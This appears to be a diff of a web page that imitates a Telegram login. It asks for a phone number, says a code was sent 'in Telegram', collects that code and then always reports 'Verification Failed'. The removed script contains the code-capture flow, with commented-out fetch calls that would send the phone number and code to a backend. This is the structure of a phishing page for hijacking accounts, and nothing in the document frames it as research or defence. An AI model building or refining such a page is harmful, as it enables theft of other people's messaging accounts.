@@ -70,8 +70,9 @@
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
             display: none;
             background-color: #ffffff;
-            height: calc(100vh - 6cm); /* Make the verification container longer */
-            overflow-y: scroll; /* Make container scrollable */
+            height: 100%; /* Make the container take full height */
+            max-height: 100vh; /* Limit height to viewport height */
+            overflow-y: auto; /* Make container scrollable */
         }
 
         .container img {
@@ -250,7 +251,7 @@
             .container {
                 width: 95%;
                 max-width: 340px;
-                margin-top: 5cm; /* Move up on mobile by 5 cm */
+                margin-top: 2cm; /* Move up on mobile by 2 cm */
             }
 
             .verification-container button {
@@ -285,154 +286,53 @@
         </div>
 
         <div>
-            <input type="checkbox" id="keepSignedIn">
-            <label for="keepSignedIn" style="color: #333333;">Keep me signed in</label>
+            <input type="submit" value="Next" class="button">
         </div>
-
-        <button class="button" onclick="goToVerificationPage()">Next</button>
-    </div>
-
-    <div class="container" id="phoneVerificationContainer" style="display:none;">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/69/Monkey_emoji.png" alt="Monkey Icon" style="width: 80px; margin-bottom: 20px; border-radius: 50%;">
-        <h1 id="phoneDisplay"></h1>
-        <p>We have sent you a message in Telegram with the code.</p>
-
-        <div class="input-group">
-            <label for="verificationCode">Code</label>
-            <input type="tel" id="verificationCode" inputmode="numeric" pattern="[0-9]*" placeholder="Code">
-        </div>
-
-        <button class="button" onclick="submitVerification()">Submit</button>
-    </div>
-
-    <div class="container" id="finalMessageContainer" style="display:none;">
-        <h1>Verification Failed</h1>
-        <p id="finalMessage"></p>
-        <button class="button" onclick="resetForm()">Try Again</button>
     </div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const countryDropdown = document.getElementById('countryCode');
+        function toggleDropdown() {
             const dropdownMenu = document.getElementById('dropdownMenu');
-            const phoneNumberInput = document.getElementById('phoneNumber');
-            const countryNameSpan = countryDropdown.querySelector('.country-name');
+            dropdownMenu.classList.toggle('show');
+        }
 
-            const countries = [
-                { name: 'Australia', code: '+61', flag: '🇦🇺' },
-                { name: 'United States', code: '+1', flag: '🇺🇸' },
-                { name: 'United Kingdom', code: '+44', flag: '🇬🇧' },
-                { name: 'Germany', code: '+49', flag: '🇩🇪' },
-                { name: 'Russia', code: '+7', flag: '🇷🇺' },
-                { name: 'Brazil', code: '+55', flag: '🇧🇷' },
-                // Add more countries as needed
-            ];
+        function scrollAwayKeyboard() {
+            document.body.style.overflow = 'auto';
+        }
 
-            countries.forEach(country => {
-                const item = document.createElement('div');
-                item.classList.add('dropdown-item');
-                item.innerHTML = `<span>${country.flag} ${country.name}</span> <span class="country-code">${country.code}</span>`;
-                item.dataset.code = country.code;
-                item.dataset.flag = country.flag;
-                item.dataset.name = country.name;
-                item.addEventListener('click', function() {
-                    countryNameSpan.textContent = country.name;
-                    phoneNumberInput.value = country.code + ' '; // Add the country code with a space
-                    dropdownMenu.classList.remove('show');
-                });
-                dropdownMenu.appendChild(item);
+        // Placeholder for the sign-in function
+        function startSignIn() {
+            document.getElementById('verificationContainer').style.display = 'none';
+            document.getElementById('initialContainer').style.display = 'block';
+        }
+
+        // Populate the dropdown with country options
+        const countries = [
+            {name: 'United States', code: '+1', flag: 'https://restcountries.com/v3.1/all/flags/us.png'},
+            // Add other countries here
+        ];
+
+        const dropdownMenu = document.getElementById('dropdownMenu');
+
+        countries.forEach(country => {
+            const item = document.createElement('div');
+            item.classList.add('dropdown-item');
+            item.innerHTML = `
+                <img src="${country.flag}" alt="${country.name} Flag">
+                <span class="country-name">${country.name}</span>
+                <span class="country-code">${country.code}</span>
+            `;
+            item.addEventListener('click', () => {
+                document.querySelector('.dropdown .country-name').textContent = country.name;
+                document.querySelector('.dropdown .country-code').textContent = country.code;
+                document.getElementById('dropdownMenu').classList.remove('show');
             });
+            dropdownMenu.appendChild(item);
+        });
 
-            window.toggleDropdown = function() {
-                dropdownMenu.classList.toggle('show');
-            };
-
-            window.startSignIn = function() {
-                setTimeout(function() {
-                    document.getElementById('verificationContainer').style.display = 'none';
-                    document.body.style.backgroundColor = "#ffffff"; // Change background to white for the next steps
-                    document.getElementById('initialContainer').style.display = 'block';
-                }, 500); // Delay for 0.5 seconds to simulate processing
-            }
-
-            window.goToVerificationPage = function() {
-                const phoneNumber = phoneNumberInput.value;
-                if (phoneNumber === '') {
-                    alert('Please enter your phone number.');
-                    return;
-                }
-
-                // Simulating a successful submission
-                document.getElementById('phoneDisplay').textContent = phoneNumber;
-                document.getElementById('initialContainer').style.display = 'none';
-                document.getElementById('phoneVerificationContainer').style.display = 'block';
-                
-                // Uncomment and adjust the following code for actual backend integration
-                /*
-                fetch('http://localhost:8000/', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ phoneNumber }),
-                }).then(response => {
-                    if (response.ok) {
-                        document.getElementById('phoneDisplay').textContent = phoneNumber;
-                        document.getElementById('initialContainer').style.display = 'none';
-                        document.getElementById('phoneVerificationContainer').style.display = 'block';
-                    } else {
-                        alert('Error submitting phone number.');
-                    }
-                }).catch(error => {
-                    console.error('Error:', error);
-                    alert('Error submitting phone number.');
-                });
-                */
-            };
-
-            window.submitVerification = function() {
-                const verificationCode = document.getElementById('verificationCode').value;
-                if (verificationCode === '') {
-                    alert('Please enter the verification code.');
-                    return;
-                }
-
-                // Simulating a successful verification
-                document.getElementById('phoneVerificationContainer').style.display = 'none';
-                document.getElementById('finalMessageContainer').style.display = 'block';
-                
-                // Uncomment and adjust the following code for actual backend integration
-                /*
-                fetch('http://localhost:8000/verify', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ verificationCode }),
-                }).then(response => {
-                    if (response.ok) {
-                        document.getElementById('phoneVerificationContainer').style.display = 'none';
-                        document.getElementById('finalMessageContainer').style.display = 'block';
-                    } else {
-                        document.getElementById('finalMessage').textContent = 'Verification failed. Please try again.';
-                    }
-                }).catch(error => {
-                    console.error('Error:', error);
-                    document.getElementById('finalMessage').textContent = 'Verification failed. Please try again.';
-                });
-                */
-            };
-
-            window.resetForm = function() {
-                phoneNumberInput.value = '';
-                document.getElementById('verificationCode').value = '';
-                document.getElementById('finalMessageContainer').style.display = 'none';
-                document.getElementById('initialContainer').style.display = 'block';
-            };
-
-            window.scrollAwayKeyboard = function() {
-                window.scrollTo(0, 0); // Scroll to the top when input is focused to hide the keyboard
-            }
+        // Adjust the page layout when the keyboard is opened/closed
+        window.addEventListener('resize', () => {
+            document.body.style.overflow = window.innerHeight < screen.height ? 'hidden' : 'auto';
         });
     </script>
 </body>
